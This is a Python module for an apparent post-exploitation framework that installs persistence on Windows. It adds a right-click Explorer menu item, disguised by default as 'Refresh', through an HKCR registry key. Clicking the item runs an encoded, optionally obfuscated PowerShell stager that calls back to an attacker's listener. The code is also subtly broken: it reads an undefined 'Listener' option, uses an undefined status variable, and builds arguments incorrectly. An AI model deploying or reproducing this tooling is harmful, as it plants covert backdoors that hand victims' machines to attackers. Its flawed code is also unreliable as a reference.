from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-ContextMenuPersist',

            'Author': ['@matterpreter', 'Matt Hand'],

            'Description': ('This script adds an item to the context menu that '
                            'will execute a user-supplied command by writing to '
                            'the HKCR:\Directory\Background\shell key. When the '
                            'user right clicks in Explorer, they will see a new '
                            'menu item that will execute a launcher when clicked.'
                            'This technique has an easy detection and removal '
                            'rating.'),

            'Background': False,

            'OutputExtension': None,

            'NeedsAdmin': True,

            'OpsecSafe': False,

            'Language': 'powershell',

            'MinLanguageVersion': '2',

            'Comments': [
                'http://www.hexacorn.com/blog/2018/07/29/beyond-good-ol-run-key-part-82/'
            ]
        }

        self.options = {
            # Format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description':   'Agent to write the key to.',
                'Required'   :   True,
                'Value'      :   ''
            },
            'MenuName': {
                'Description':   'String that will be shown to the user when they right click.',
                'Required'   :   True,
                'Value'      :   'Refresh'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        listenerName = self.options['Listener']['Value']

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']


        script = """
function Invoke-ContextMenuPersist
{
    <#
    .SYNOPSIS
    This script adds an item to the context menu that will execute the provided
    command.
    Author: Matt Hand (@matterpreter)
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.0
    .DESCRIPTION
    This script adds an item to the context menu that will execute a user-
    supplied command by writing to the HKCR:\Directory\Background\shell key.
    .PARAMETER MenuName
    String that will be shown to the user when they right click.
    .PARAMETER Command
    Legitimate command that will run before the launcher is executed
    .EXAMPLE
    Invoke-ContextMenuPersist 'Launch Chrome' 'powershell.exe'
    #>

    Param(
          [Parameter(Mandatory=$true)]
          [string]$MenuName,
          [string]$Command
    )

    #Map HKCR since it isn't mapped by default
    New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
    #Write the keys
    New-Item -Path 'HKCR:\Directory\Background\shell' -Name $MenuName -Force | Out-Null
    $KeyPath = 'HKCR:\Directory\Background\shell\' + $MenuName + '\command'
    New-Item $KeyPath -Force | New-ItemProperty -Name "(Default)" -Value $Command -Force | Out-Null
}
Invoke-ContextMenuPersist"""

        scriptEnd = ""



        # if an external file isn't specified, use a listener
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""

        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

            encScript = launcher.split(" ")[-1]
            statusMsg += "using listener " + listenerName

        # Add any arguments to the end execution of the script
        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
                        scriptEnd += "-Command " + encScript
        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
